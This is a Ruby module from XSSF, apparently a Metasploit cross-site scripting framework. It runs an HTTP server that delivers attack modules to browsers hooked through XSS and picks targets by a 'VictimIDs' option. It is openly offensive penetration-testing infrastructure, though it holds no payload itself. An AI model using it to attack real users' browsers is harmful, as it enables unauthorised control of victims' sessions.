#
# This class implements Msf HTTPServer used to run XSSF modules
#
module Msf
module Xssf
	module XssfServer
		include Msf::Exploit::Remote::HttpServer::HTML
		include Msf::Xssf::XssfDatabase

		def initialize(info = {})
			super(update_info(info,
				'Name'        => 'XSSF MODULE',
				'Description' => 'XSSF MODULE',
				'Author'      => 'LuDo (CONIX Security)',
				'License'     => MSF_LICENSE
			))

			register_options(
				[
					OptString.new('VictimIDs', [true, 'IDs of the victims you want to receive the code.\nExamples : 1, 3-5 / ALL / NONE', 'ALL'])
				], Msf::Xssf::XssfServer
			)
			
			deregister_options('SSL', 'SSLVersion')		# Won't work with XSSF
		end


		#
		# Run an auxiliary module
		#
		def run		
			# Check if XSSF plugin is loaded
			active = false
			framework.plugins.each {|x| active = true if  (x.name == "xssf")}

			if (!active)
				print_error("XSSF plugin must be started first ! [load xssf]")
				return
			end

			begin
				print_status("Auxiliary module execution started, press [CTRL + C] to stop it !") 
				start_service;

				url = "http://#{(datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('1.2.3.4') : datastore['SRVHOST']}:#{datastore['SRVPORT']}#{get_resource}"
				datastore['VictimIDs'] = datastore['VictimIDs'].gsub(/\s*/, '')
			
				# If victim ID are provided : Process victims IDs and attacks given victims
				process_victims_string(datastore['VictimIDs'], "attack_victim", url, self.fullname) if (datastore['VictimIDs'].upcase != "NONE")
	
				puts ""; attacked_victims
				
				# Loop and wait for console interruption
				while (true) do; Rex::ThreadSafe.sleep(5); end;
			rescue ::Interrupt
				print_error("Auxiliary interrupted by the console user")
			rescue ::Exception
				print_error("Error : #{$!}")
			end
		end
	end
end
end